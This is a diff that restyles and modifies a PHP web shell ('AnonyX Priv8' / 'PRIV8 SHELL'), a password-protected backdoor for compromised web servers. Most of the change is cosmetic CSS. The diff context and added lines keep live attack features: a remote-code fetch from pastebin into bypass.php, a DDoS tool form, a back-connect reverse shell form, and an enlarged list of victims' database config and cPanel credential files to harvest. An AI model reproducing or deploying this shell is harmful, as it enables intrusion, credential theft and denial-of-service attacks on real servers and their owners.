@@ -28,7 +28,7 @@ function login_shell() {
 ?>
 <html>
 <head>
-<title>AnonyX Priv Shell </title>
+<title>HARO :) </title>
 <iframe width="0" height="0" src="https://api.soundcloud.com/tracks/393966522/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscry="" loop="allow"></iframe>
 <link href='https://cdn.weasyl.com/static/media/31/34/b1/3134b18cb985f08053235b9a5e4b91a0078a815b893241bba253523e9f87cd15.png' rel='icon' type='image/x-icon'/>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
@@ -39,199 +39,6 @@ function login_shell() {
   margin: auto;
 }
 
-/*Neon*/
-p {
-  text-align: center;
-  font-size: 7em;
-  margin: 20px 0 20px 0;
-}
-
-a {
-  text-decoration: none;
-  transition: all 0.5s;
-}
-
-p:nth-child(1) a {
-  color: #fff;
-  font-family: Monoton;
-  -webkit-animation: neon1 1.5s ease-in-out infinite alternate;
-  animation: neon1 1.5s ease-in-out infinite alternate;
-}
-
-p:nth-child(1) a:hover {
-  color: #FF1177;
-  -webkit-animation: none;
-  animation: none;
-}
-
-p:nth-child(2) a {
-  font-size: 1.5em;
-  color: #228DFF;
-  font-family: Iceland;
-}
-
-p:nth-child(2) a:hover {
-  -webkit-animation: neon2 1.5s ease-in-out infinite alternate;
-  animation: neon2 1.5s ease-in-out infinite alternate;
-}
-
-p:nth-child(3) a {
-  color: #FFDD1B;
-  font-family: Pacifico;
-}
-
-p:nth-child(3) a:hover {
-  -webkit-animation: neon3 1.5s ease-in-out infinite alternate;
-  animation: neon3 1.5s ease-in-out infinite alternate;
-}
-
-p:nth-child(4) a {
-  color: #B6FF00;
-  font-family: "Press Start 2P";
-  font-size: 0.8em;
-}
-
-p:nth-child(4) a:hover {
-  -webkit-animation: neon4 1.5s ease-in-out infinite alternate;
-  animation: neon4 1.5s ease-in-out infinite alternate;
-}
-
-p:nth-child(5) a {
-  color: #FF9900;
-  font-family: Audiowide;
-}
-
-p:nth-child(5) a:hover {
-  -webkit-animation: neon5 1.5s ease-in-out infinite alternate;
-  animation: neon5 1.5s ease-in-out infinite alternate;
-}
-
-p:nth-child(6) a {
-  color: #BA01FF;
-  font-family: Vampiro One;
-}
-
-p:nth-child(6) a:hover {
-  -webkit-animation: neon6 1.5s ease-in-out infinite alternate;
-  animation: neon6 1.5s ease-in-out infinite alternate;
-}
-
-p a:hover {
-  color: #ffffff;
-}
-/*glow for webkit*/
-
-@-webkit-keyframes neon1 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #FF1177, 0 0 70px #FF1177, 0 0 80px #FF1177, 0 0 100px #FF1177, 0 0 150px #FF1177;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #FF1177, 0 0 35px #FF1177, 0 0 40px #FF1177, 0 0 50px #FF1177, 0 0 75px #FF1177;
-  }
-}
-
-@-webkit-keyframes neon2 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #228DFF, 0 0 70px #228DFF, 0 0 80px #228DFF, 0 0 100px #228DFF, 0 0 150px #228DFF;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #228DFF, 0 0 35px #228DFF, 0 0 40px #228DFF, 0 0 50px #228DFF, 0 0 75px #228DFF;
-  }
-}
-
-@-webkit-keyframes neon3 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #FFDD1B, 0 0 70px #FFDD1B, 0 0 80px #FFDD1B, 0 0 100px #FFDD1B, 0 0 150px #FFDD1B;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #FFDD1B, 0 0 35px #FFDD1B, 0 0 40px #FFDD1B, 0 0 50px #FFDD1B, 0 0 75px #FFDD1B;
-  }
-}
-
-@-webkit-keyframes neon4 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #B6FF00, 0 0 70px #B6FF00, 0 0 80px #B6FF00, 0 0 100px #B6FF00, 0 0 150px #B6FF00;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #B6FF00, 0 0 35px #B6FF00, 0 0 40px #B6FF00, 0 0 50px #B6FF00, 0 0 75px #B6FF00;
-  }
-}
-
-@-webkit-keyframes neon5 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #FF9900, 0 0 70px #FF9900, 0 0 80px #FF9900, 0 0 100px #FF9900, 0 0 150px #FF9900;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #FF9900, 0 0 35px #FF9900, 0 0 40px #FF9900, 0 0 50px #FF9900, 0 0 75px #FF9900;
-  }
-}
-
-@-webkit-keyframes neon6 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #ff00de, 0 0 70px #ff00de, 0 0 80px #ff00de, 0 0 100px #ff00de, 0 0 150px #ff00de;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #ff00de, 0 0 35px #ff00de, 0 0 40px #ff00de, 0 0 50px #ff00de, 0 0 75px #ff00de;
-  }
-}
-/*glow for mozilla*/
-/*glow*/
-
-@keyframes neon1 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #FF1177, 0 0 70px #FF1177, 0 0 80px #FF1177, 0 0 100px #FF1177, 0 0 150px #FF1177;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #FF1177, 0 0 35px #FF1177, 0 0 40px #FF1177, 0 0 50px #FF1177, 0 0 75px #FF1177;
-  }
-}
-
-@keyframes neon2 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #228DFF, 0 0 70px #228DFF, 0 0 80px #228DFF, 0 0 100px #228DFF, 0 0 150px #228DFF;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #228DFF, 0 0 35px #228DFF, 0 0 40px #228DFF, 0 0 50px #228DFF, 0 0 75px #228DFF;
-  }
-}
-
-@keyframes neon3 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #FFDD1B, 0 0 70px #FFDD1B, 0 0 80px #FFDD1B, 0 0 100px #FFDD1B, 0 0 150px #FFDD1B;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #FFDD1B, 0 0 35px #FFDD1B, 0 0 40px #FFDD1B, 0 0 50px #FFDD1B, 0 0 75px #FFDD1B;
-  }
-}
-
-@keyframes neon4 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #B6FF00, 0 0 70px #B6FF00, 0 0 80px #B6FF00, 0 0 100px #B6FF00, 0 0 150px #B6FF00;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #B6FF00, 0 0 35px #B6FF00, 0 0 40px #B6FF00, 0 0 50px #B6FF00, 0 0 75px #B6FF00;
-  }
-}
-
-@keyframes neon5 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #FF9900, 0 0 70px #FF9900, 0 0 80px #FF9900, 0 0 100px #FF9900, 0 0 150px #FF9900;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #FF9900, 0 0 35px #FF9900, 0 0 40px #FF9900, 0 0 50px #FF9900, 0 0 75px #FF9900;
-  }
-}
-
-@keyframes neon6 {
-  from {
-    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff, 0 0 40px #ff00de, 0 0 70px #ff00de, 0 0 80px #ff00de, 0 0 100px #ff00de, 0 0 150px #ff00de;
-  }
-  to {
-    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #ff00de, 0 0 35px #ff00de, 0 0 40px #ff00de, 0 0 50px #ff00de, 0 0 75px #ff00de;
-  }
-}
-/*REEEEEEEEEEESPONSIVE*/
-
 @media (max-width: 650px) {
   #container {
     width: 100%;
@@ -241,7 +48,6 @@ p a:hover {
   }
 }
 html {
-     background-image: url('https://namapenerbitbukuterkenal.files.wordpress.com/2018/03/nama-penerbit-buku-murah-e1520847698780.jpg?w=640');
      background-color: black;
      text-shadow: 0 0 0.10em white;
   -webkit-background-size: cover;
@@ -265,29 +71,220 @@ input.own {
     border : 0px solid #ccc;
     box-shadow: 0 0 0.9em red;
 }
+html {
+  background: #000;
+}
 
+body {
+  width: 600px;
+  margin: 0 auto;
+}
+.horror-text {
+  animation-duration: 1.5s;
+  animation-iteration-count: infinite;
+  animation-name: flickering;
+  animation-timing-function: step-start;
+  color: #912914;
+  font-family: 'UnifrakturCook', cursive;
+  font-size: 96px;
+}
+
+@keyframes flickering {
+  0% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  5% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  10% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(-15deg);
+  }
+  15% {
+    color: #ccc;
+    text-shadow: none;
+    transform: skewX(-15deg);
+  }
+  20% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  25% {
+    color: #ccc;
+    text-shadow: 2px 2px #912914;
+    transform: skewX(0);
+  }
+  30% {
+    color: #ccc;
+    text-shadow: 2px 2px #912914;
+    transform: skewX(0);
+  }
+  35% {
+    color: #ccc;
+    text-shadow: 2px 2px #912914;
+    transform: skewX(0);
+  }
+  37% {
+    color: #ccc;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  40% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  45% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  50% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  55% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  60% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  65% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  68% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  70% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  75% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(10deg);
+  }
+  80% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(10deg);
+  }
+  85% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(10deg);
+  }
+  90% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  95% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  100% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+}
+
+
+/* Additional styling */
+html, body {
+  background-color: #000;
+  border: 0;
+  height: 100%;
+  margin: 0;
+  overflow: hidden;
+  padding: 0;
+  width: 100%;
+}
+
+.center {
+  left: 50%;
+  position: absolute;
+  top: 50%;
+  transform: translate(-50%, -50%);
+}
+body { font: 400 1em/1.5 "Neuton"; background: #000; color: rgba(255,255,255,.25); text-align: center; margin: 0 }
+
+p {
+  text-transform: uppercase;
+  letter-spacing: .5em;
+  display: inline-block;
+  border: 4px double rgba(255,255,255,.25);
+  border-width: 4px 0;
+  padding: 1.5em 0em;
+  top: 18%;
+  width: 40em;
+  margin: 0 0 0 -20em;
+  
+  span {
+
+    font: 700 4em/1 "Oswald", sans-serif;
+    letter-spacing: 0;
+    padding: .25em 0 .325em;
+    display: block;
+    margin: 0 auto;
+    text-shadow: 0 0 80px rgba(255,255,255,.5);
+
+/* Clip Background Image */
+
+    background: url(http://f.cl.ly/items/010q3E1u3p2Q0j1L1S1o/animated_text_fill.png) repeat-y;
+    -webkit-background-clip: text;
+    background-clip: text;
+
+/* Animate Background Image */
+
+    -webkit-text-fill-color: transparent;
+    -webkit-animation: aitf 80s linear infinite;
+
+/* Activate hardware acceleration for smoother animations */
+
+    -webkit-transform: translate3d(0,0,0);
+    -webkit-backface-visibility: hidden;
+
+  }
+}
+
+/* Animate Background Image */
+
+@-webkit-keyframes aitf {
+  0% { background-position: 0% 50%; }
+  100% { background-position: 100% 50%; }
+}
 </style>
-<script src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js" type="text/javascript"></script>
 </head>
  <body>
+<div class="center">
+<img src="https://scontent-sin6-2.xx.fbcdn.net/v/t1.0-9/52546745_267242230841757_7025904229478825984_n.jpg?_nc_cat=106&_nc_ht=scontent-sin6-2.xx&oh=e990158960e8c6aef1fdd401fc025da5&oe=5D4D32F4" width="250" height="250"/>
+<div class="horror-text">PRIV8 SHELL</div><br />
+</div>
 <center>
-<font face="monospace" size='3' color='lavender'><br>
-
- 
-<header>
-<pre>
-    </pre>
-</header>
-<table>
-                    <font face="DEBIAN">
-  <div id="container">
-
-  <p><a href="#">
-    Priv8 Shell
-  </a></p>
 <form method="post">
 <input type="password" name="pass" placeholder="Input The passwd"> <br><br>
 <input type="submit" value="Login" class="own">
+<table>
+  <div id="container">
 
 </TD>
 </style>
@@ -343,7 +340,7 @@ li {
 }
 
  #menu{
-    background:#111111;
+    background:#000;
     margin:9px 3px 4px 2px;
 }
 #menu a{
@@ -440,6 +437,135 @@ option:hover {
 .infoweb {
     border-right: 1px solid #00FFFF;
 }
+.horror-text {
+  animation-duration: 1.5s;
+  animation-iteration-count: infinite;
+  animation-name: flickering;
+  animation-timing-function: step-start;
+  color: #912914;
+  font-family: 'UnifrakturCook', cursive;
+  font-size: 96px;
+}
+
+@keyframes flickering {
+  0% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  5% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  10% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(-15deg);
+  }
+  15% {
+    color: #ccc;
+    text-shadow: none;
+    transform: skewX(-15deg);
+  }
+  20% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  25% {
+    color: #ccc;
+    text-shadow: 2px 2px #912914;
+    transform: skewX(0);
+  }
+  30% {
+    color: #ccc;
+    text-shadow: 2px 2px #912914;
+    transform: skewX(0);
+  }
+  35% {
+    color: #ccc;
+    text-shadow: 2px 2px #912914;
+    transform: skewX(0);
+  }
+  37% {
+    color: #ccc;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  40% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  45% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  50% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  55% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  60% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  65% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  68% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  70% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  75% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(10deg);
+  }
+  80% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(10deg);
+  }
+  85% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(10deg);
+  }
+  90% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+  95% {
+    color: #912914;
+    text-shadow: 1px 1px #eee;
+    transform: skewX(0);
+  }
+  100% {
+    color: #912914;
+    text-shadow: none;
+    transform: skewX(0);
+  }
+}
+
+
 </style>
 </head>
 <?php
@@ -647,7 +773,7 @@ if(!function_exists('posix_getegid')) {
 
 echo '<center><div id="menu">';
 echo "<BR>";
-echo "<center><font size='6px' color='lavender'>AnonyX Priv8</font>";
+echo "<center><font color='lime'>AnonyX Priv8</font>";
 echo "<br>";
 echo "<p>";
 
@@ -751,96 +877,7 @@ if($xp == "bypassserver"){
             $config = parah("http://pastebin.com/raw/ATSD5myG", "bypass.php");
        echo '<center><font color =red><a href="bypass.php" target="_blank">Clik Here To Switch Bypass</a><br></font></center>';
 } elseif($_GET['do'] == 'whois') {
-@set_time_limit(0);
-   @error_reporting(0);
-   function sws_domain_info($site)
-   {
-   $getip = @file_get_contents("http://networktools.nl/whois/$site");
-   flush();
-   $ip = @findit($getip,'<pre>','</pre>');
-   return $ip;
-   flush();
-   }
-   function sws_net_info($site)
-   {
-   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
-   $ip = @findit($getip,'<pre>','</pre>');
-   return $ip;
-   flush();
-   }
-   function sws_site_ser($site)
-   {
-   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
-   $ip = @findit($getip,'<pre>','</pre>');
-   return $ip;
-   flush();
-   }
-   function sws_sup_dom($site)
-   {
-   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
-   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
-   return $ip;
-   flush();
-   }
-   function sws_port_scan($ip)
-   {
-   $list_post = array('80','21','22','2082','25','53','110','443','143');
-   foreach ($list_post as $o_port)
-   {
-   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
-   if($connect)
-   {
-   echo ' $ip : $o_port ??? <u style="color: lime">Open</u> <br /><br />';
-   flush();
-   }
-   }
-   }
-   function findit($mytext,$starttag,$endtag) {
-   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
-   $posRight = @stripos($mytext,$endtag,$posLeft+1);
-   return @substr($mytext,$posLeft,$posRight-$posLeft);
-   flush();
-   }
-   echo '<br><br><center>';
-   echo '
-    <br />
-    <div class="sc"><form method="post"><table>
-    <tr><th colspan="5" style="border: 2px lime dotted;">Whois Site</th></tr>
-    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:Lavender;" class="inputz" value="site.com" /> � <input class="inputzbut" type="submit" style="color:Lavender;background-color:#000000" name="scan" value="Scan !" /></td></tr>
-    </table></form></div>';
-   if(isset($_POST['scan']))
-   {
-   $site = @htmlentities($_POST['site']);
-   if (empty($site)){die('<br /><br /> Not add IP .. !');}
-   $ip_port = @gethostbyname($site);
-   echo "
-   <br /><div class='sc2'>Scanning [ $site ip $ip_port ] ... </div>
-   <div class='tit'> <br /><br />|-------------- Port Server ------------------| <br /></div>
-   <div class='ru'> <br /><br /><pre>
-   ";
-   echo "".sws_port_scan($ip_port)." </pre></div> ";
-   flush();
-   echo '<div class="tit"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
-   <div class="ru">
-   <pre>".sws_domain_info($site)."</pre></div>';
-   flush();
-   echo '
-   <div class="tit"> <br /><br />|-------------- Network Info ------------------| <br /></div>
-   <div class="ru">
-   <pre>".sws_net_info($site)."</pre> </div>';
-   flush();
-   echo '<div class="tit"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
-   <div class="ru">
-   <pre>".sws_sup_dom($site)."</pre> </div>';
-   flush();
-   echo '<div class="tit"> <br /><br />|-------------- Site Server ------------------| <br /></div>
-   <div class="ru">
-   <pre>".sws_site_ser($site)."</pre> </div>
-   <div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
-   flush();
-   }
-    echo '</center>';
- 
+echo "BELUM ADA FITUR INI COEG. MAAF EA";
 } elseif($_GET['do'] == 'whois') {
 ?>
 <body >
@@ -874,7 +911,7 @@ if($xp == "bypassserver"){
 <option value="sss" style='background:transparent;color:lime;'>htmlspecialchars</option>
 <option value="eee" style='background:transparent;color:lime;'>escape</option></select><br><input class='inputzbut' type='submit' name='submit' value='Encode' style="background:transparent;color:lime;">
 <input class='inputzbut' type='submit' name='crack' value='Decode' style="background:transparent;color:lime;"><br>
-</select>�
+</select>?
 </form>
 <?php
 $submit = $_POST['submit'];
@@ -1000,7 +1037,7 @@ if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file'){
       ?>
       <center>
       <table>
-         <tr><td align="left" class="me"><strong><?=$filename?>��>> Contains :�<?=$vuln?></strong></td></tr>
+         <tr><td align="left" class="me"><strong><?=$filename?>??>> Contains :?<?=$vuln?></strong></td></tr>
          <tr><td class="me">
             <form method="post" action="">
             <input type="hidden" name="file" value="<?=$filename?>">
@@ -1077,9 +1114,9 @@ function ListFiles($dir) {
       <tr>
          <td align="right" width="30"><b>No</b></td>
          <td align="center" width="105"><b> T y p e </b></td>
-         <td align="center"><b> F i l e��L o c a t i o n </b></td>
-         <td align="center" width="150"><b> L a s t��E d i t </b></td>
-         <td  align="right" width="80"><b>F i l e��S i z e</b></td>
+         <td align="center"><b> F i l e??L o c a t i o n </b></td>
+         <td align="center" width="150"><b> L a s t??E d i t </b></td>
+         <td  align="right" width="80"><b>F i l e??S i z e</b></td>
       </tr><br>
 <?php
 $target=$_SERVER['DOCUMENT_ROOT'];
@@ -1224,7 +1261,7 @@ $target=$_SERVER['DOCUMENT_ROOT'];
          <td align="center"><?=$bugs?></td>
          <td align="center"> not exist </td>
          <td align="center"> no record </td>
-         <td align="right"> -����byte </td>
+         <td align="right"> -????byte </td>
       </tr>
    <?php
          }
@@ -1288,7 +1325,7 @@ $target=$_SERVER['DOCUMENT_ROOT'];
                   }  
                }
             </script>
-            <input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />�<?=$bug?><br>
+            <input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />?<?=$bug?><br>
             <?php
             }
             ?>
@@ -1446,16 +1483,103 @@ echo "<from><textarea cols=80 rows=10 class='form-control con7' >".$html."</text
 }
         elseif($_GET['do'] == 'about') {
 ?>
-<br>
-    
-    <div class="terimakasih">
-<tr><td><center><font color="gold" size="10">CREATOR AND RECODE THIS SHELL & KEEP EXPLOITING :)
-    <p><font color="white" size="19" style="text-shadow: 0 0 0.10em aqua;" face="M5">./PuttCh4n :) </font>
-<br>
-    <br><font color="black"><font></font> <br> ANT1 TYKVNG SH3LL
-</td></tr>
- 
- 
+<style>
+@import url(https://fonts.googleapis.com/css?family=Raleway:400,300|Raleway+Dots|Lato:300|Inconsolata|Montserrat);
+
+$title: #24bba0;
+$header: #5371e1;
+$detail: #b2b2b2;
+$highlight: #5371e1;
+$text: #ffffff;
+
+body {
+    background: black;
+  letter-spacing: 2px;
+  font-family: "Lato", Arial, Helvetica, sans-serif;
+  font-size: 16px;
+  padding: 0;
+  margin: 0;
+  height: 100%;
+  width: 100%;
+  line-height: 1.5;
+  color: white
+}
+
+.skills {
+      max-width: 50%;
+      margin: 40px auto;
+      text-align: center;
+      .hr-text {
+        font-size: 20px;
+        position: relative;
+        border: 0;
+        height: 1.5em;
+        &:before {
+          content: '';
+          background: linear-gradient(to right, transparent, $detail, transparent);
+          position: absolute;
+          left: 0;
+          top: 50%;
+          width: 100%;
+          height: 1px;
+        }
+        &:after {
+          content: attr(data-content);
+          position: relative;
+          display: inline-block;
+          color: black;
+
+          padding: 0 .5em;
+          line-height: 1.5em;
+          color: $title;
+          background-color: black;
+        }
+      }
+      li {
+        display: inline-block;
+        font-size: 14px;
+      }
+      i {
+        font-size: 7px;
+      }
+    }
+</style>
+  <div class="skills">
+    <hr class="hr-text" data-content="Technologies">
+    <ul id="techlist">
+      <li>JavaScript</li>
+      <i class="circle icon"></i>
+      <li>Ruby</li>
+      <i class="circle icon"></i>
+      <li>Rails</li>
+      <i class="circle icon"></i>
+      <li>jQuery</li>
+      <i class="circle icon"></i>
+      <li>MEAN stack</li>
+      <i class="circle icon"></i>
+      <li>Bootstrap</li>
+      <i class="circle icon"></i>
+      <li>Semantic-UI</li>
+      <i class="circle icon"></i>
+      <li>Postgres</li>
+      <i class="circle icon"></i>
+      <li>SQL</li>
+      <i class="circle icon"></i>
+      <li>Sass</li>
+      <i class="circle icon"></i>
+      <li>Git</li>
+      <i class="circle icon"></i>
+      <li>HTML</li>
+      <i class="circle icon"></i>
+      <li>CSS</li>
+      <i class="circle icon"></i>
+      <li>Heroku</li>
+      <i class="circle icon"></i>
+      <li>AWS</li>
+      <i class="circle icon"></i>
+      <li>InDesign</li>
+    </ul>
+  </div>
     <?php
 } elseif($_GET['do'] == 'csrf') {
 ?>      <html>
@@ -1600,7 +1724,7 @@ else {
 <html>
 <form action=" " method="post">
 <center><br><br><br>
-Your IP: <font color="Lavender"><b><?php echo $my_ip; ?></b></font>�(Don't DoS yourself nub)<br><br>
+Your IP: <font color="Lavender"><b><?php echo $my_ip; ?></b></font>?(Don't DoS yourself nub)<br><br>
 <table class="tabnet" style="width:333px;padding:0 1px;">
 <th colspan="5">Ddos Tool</th>
 <tr><tr><td>IP Target</td><td>:</td>
@@ -1707,7 +1831,13 @@ Your IP: <font color="Lavender"><b><?php echo $my_ip; ?></b></font>�(Don't DoS
                 $user_config_dir = "/home/$user_idx/public_html/";
                 if(is_readable($user_config_dir)) {
                     $grab_config = array(
-                        "/home/$user_idx/.cpanel/contactinfo" => "cpanel Crack",
+                        "/home/$user_idx/public_html/include/database.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/include/configuration.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/include/db.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/include/config.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/mysql.connect.php" => "Yii CMS",
+                        "/home/$user_idx/public_html/mysql.connection.php" => "Yii CMS",
+                        "/home/$user_idx/.cpanel/contactinfo" => "CP Crack",
                         "/home/$user_idx/.my.cnf" => "cpanel",
                         "/home/$user_idx/.accesshash" => "WHM-accesshash",
                         "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
@@ -2811,7 +2941,7 @@ echo "</center></table>";
     </form>
     <form method='post'>
     <u>Back Connect:</u> <br>
-    Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>��
+    Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>??
     PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
     <input type='submit' name='sub_bc' value='>>'>
     </form>";
